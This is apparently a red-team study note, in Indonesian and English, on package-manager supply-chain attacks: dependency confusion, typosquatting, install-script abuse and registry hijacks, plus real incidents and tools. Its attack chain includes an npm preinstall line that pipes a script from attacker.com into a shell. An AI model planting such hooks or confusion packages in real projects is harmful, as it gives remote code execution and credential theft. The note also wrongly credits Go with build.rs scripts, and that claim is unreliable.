---
title: Attack Perspective — Package Managers (Red Team Supply Chain)
tags:
- attack
- red-team
- package-managers
- dependency
- confusion
- typosquatting
- npm
- pip
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---

# Package Managers — Perspektif Penyerang (Supply Chain)

> Package manager = vector supply chain paling efektif. Satu package malicious → ribuan downstream consumer. Red team eksploitasi: dependency confusion, typosquatting, install script abuse, registry hijack.

## 1. Attack Surface Package Manager

| Ecosystem | Vektor | MITRE ID | Teknik | Evasion | Detection Gap |
|-----------|--------|----------|--------|---------|----------------|
| **npm** | Dependency confusion, typosquatting, install script | T1195.001 | Public package override internal name | Package = valid, signature = N/A (npm no signing) | npm audit jarang real-time |
| **PyPI** | Typosquatting, install.py RCE, setup.py abuse | T1195.001 | `python setup.py install` → arbitrary code | PyPI no package signing | pip audit jarang |
| **crates.io** | Typosquatting, build.rs arbitrary code | T1195.001 | build script (build.rs) → execute saat compile | Cargo no signing | crate audit = manual |
| **Docker Hub** | Malicious image, tag hijack, backdoored base image | T1195.002 | Public image dengan nama mirip official | Docker no image signing (default) | Image scan jarang sebelum deploy |
| **APT/YUM** | Repo hijack, GPG key compromise | T1195.002 | Compromised repo → push malicious.deb/.rpm | GPG signed — tapi GPG key theft = valid signature | apt-get update = trust GPG key |
| **Go modules** | Module proxy hijack, version tag manipulation | T1195.001 | GOPROXY redirect → malicious module | Go checksum DB (sum.golang.org) — tapi proxy bypass | Checksum DB belum universal |
| **Homebrew** | Formula hijack, cask tamper | T1195.001 | Modified formula → arbitrary command | Formula = shell script, no sandbox | Homebrew audit = manual |

## 2. Dependency Confusion Attack Chain

```
Recon: Identifikasi internal package name
 ├── package.json (npm) — cari "dependencies" dengan scope @company/
 ├── requirements.txt (pip) — cari internal package
 ├── go.mod (Go) — cari private module path
 └── Gemfile (Ruby) — cari gem internal
 ↓
Publish: Daftar package publik dengan nama YANG SAMA
 ├── npm: npm publish --access public @company/internal-name
 ├── PyPI: python setup.py upload ke PyPI
 └── GitLab/GitHub Package Registry
 ↓
Resolution: Target build system resolve dependency
 ├── Package manager prioritas: public registry > private registry (default npm)
 ├── pip: public PyPI > private index (jika tidak pinned)
 └── Go: GOPROXY public > private (jika tidak ada checksum)
 ↓
Execute: Install script (preinstall/postinstall) → RCE
 ├── npm: "scripts": {"preinstall": "curl http://attacker.com/sh | sh"}
 ├── pip: setup.py install → arbitrary Python code
 └── Go: build.rs → arbitrary command
 ↓
Payload: CI runner compromised → cloud creds → exfil
 ↓
Persistence: Backdoor di artifact → deploy ke production
```

## 3. Install Script Abuse Matrix

| Ecosystem | Script Trigger | Execution Point | Red Team Use |
|-----------|---------------|-----------------|--------------|
| **npm** | `preinstall`, `postinstall`, `prepare` | `npm install` → execute shell command | Reverse shell, credential exfil, env var theft |
| **pip** | `setup.py` (install hook) | `pip install` → `python setup.py install` | Arbitrary Python → subprocess → RCE |
| **Go** | `build.rs` (build script) | `go build` → compile + execute build.rs | Arbitrary command saat compile |
| **Docker** | `Dockerfile` (RUN instruction) | `docker build` → execute command | Backdoor image, cryptominer, reverse shell |
| **Cargo** | `build.rs` (build script) | `cargo build` → execute build script | Arbitrary command saat compile |
| **Gem** | `gemspec` (extensions) | `gem install` → compile extension | Native extension → arbitrary code |

## 4. CVE & Kasus Nyata

| Kasus | Ecosystem | Impact | Teknik |
|-------|----------|--------|--------|
| **event-stream** (2018) | npm | Wallet theft (Copay) | Maintainer handoff → malicious update |
| **ua-parser-js** (2021) | npm | Cryptominer + credential theft | Maintainer account compromise |
| **coa**, **rc** (2021) | npm | RCE via preinstall script | Maintainer account compromise |
| **PyPI typosquatting** (2023) | PyPI | Credential theft | Package name mirip (reqeusts vs requests) |
| **XZ Utils** (CVE-2024-3094) | Linux (source) | SSH backdoor | Multi-year social engineering → build system backdoor |
| **SolarWinds SUNBURST** | APT (custom) | Global compromise | Compromised update server → signed malicious DLL |

## 5. Tool Stack

| Tool | Use |
|------|-----|
| **confUSED** | Dependency confusion attack PoC (npm) |
| **socket** (socket.dev) | Package behavior analysis (defender — red team untuk identify target) |
| **trivy** | Dependency + image vulnerability scan |
| **Syft** | SBOM generation |
| **Grype** | Vulnerability matching |
| **TruffleHog / GitLeaks** | Secret scan di package/repo |

## 6. Referensi
- npm Security — https://www.npmjs.com/) |
- XZ Utils Backdoor — https://nvd.nist.gov/vuln/detail/CVE-2024-3094
- SLSA Framework — https://slsa.dev/
---

audited
---
